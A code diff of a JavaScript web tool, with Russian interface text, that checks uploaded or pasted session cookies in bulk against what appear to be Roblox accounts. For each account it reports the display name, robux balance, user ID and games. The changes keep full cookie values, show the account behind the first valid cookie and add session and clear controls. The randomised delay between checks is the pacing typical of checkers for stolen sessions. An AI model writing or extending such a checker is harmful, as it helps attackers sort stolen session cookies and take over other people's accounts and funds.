                     status.innerHTML = `⏳ Проверка ${i + 1}/${total}...`;
 
                     const res = await checkCookie(cookie);
                     results.push({
-                        cookie: cookie.substring(0, 25) + '...',
-                        displayName: res.displayName || null,
-                        robux: res.robux !== undefined ? res.robux : null,
-                        userId: res.userId || null,
-                        games: res.games || {},
-                        error: res.error || null
+                        cookie: cookie,
+                        data: res
                     });
+
+                    // Если это первая успешная проверка — показываем результат
+                    if (i === 0 && !res.error) {
+                        renderResults(res, cookie);
+                    }
 
                     await new Promise(r => setTimeout(r, 300 + Math.random() * 400));
                 }
@@ -874,7 +1198,12 @@
                 status.innerHTML = `✅ Проверено ${total} кук.`;
                 checkBtn.disabled = false;
                 isChecking = false;
-                renderResults();
+
+                // Если не было успешной проверки — показываем первую ошибку
+                if (results.length > 0 && results[0].data.error) {
+                    renderResults(results[0].data, results[0].cookie);
+                }
+
                 setTimeout(() => { progressWrap.style.display = 'none'; }, 1500);
             }
 
@@ -889,11 +1218,17 @@
                     const reader = new FileReader();
                     reader.onload = (e) => {
                         rawFiles.push({ name: file.name, content: e.target.result });
-                        rebuildCookies();
+                        renderFiles();
+                        updateStatus();
                     };
                     reader.readAsText(file);
                 }
             }
+
+            // Текстовое поле — обновляем статус при вводе
+            cookieTextInput.addEventListener('input', () => {
+                updateStatus();
+            });
 
             fileInput.addEventListener('change', (e) => {
                 handleFiles(e.target.files);
@@ -916,20 +1251,40 @@
 
             checkBtn.addEventListener('click', runCheck);
 
+            // ===== ВЫХОД =====
+            exitBtn.addEventListener('click', () => {
+                currentSessionCookie = null;
+                currentUserData = null;
+                resultContainer.innerHTML = '';
+                exitBtn.style.display = 'none';
+                status.innerHTML = '🚪 Сессия завершена. Вставьте новую куку.';
+                // Очищаем всё
+                rawFiles = [];
+                results = [];
+                renderFiles();
+                cookieTextInput.value = '';
+                updateStatus();
+            });
+
+            // ===== ОЧИСТКА =====
             clearBtn.addEventListener('click', () => {
                 rawFiles = [];
-                allCookies = [];
                 results = [];
+                currentSessionCookie = null;
+                currentUserData = null;
                 resultContainer.innerHTML = '';
                 progressWrap.style.display = 'none';
                 progressBar.style.width = '0%';
+                exitBtn.style.display = 'none';
+                cookieTextInput.value = '';
                 renderFiles();
                 updateStatus();
-                status.innerHTML = '🗑 Всё очищено. Загрузите новые файлы.';
+                status.innerHTML = '🗑 Всё очищено. Вставьте новые куки.';
                 checkBtn.disabled = false;
                 isChecking = false;
             });
 
+            // ===== ИНИЦИАЛИЗАЦИЯ =====
             renderFiles();
             updateStatus();
         })();
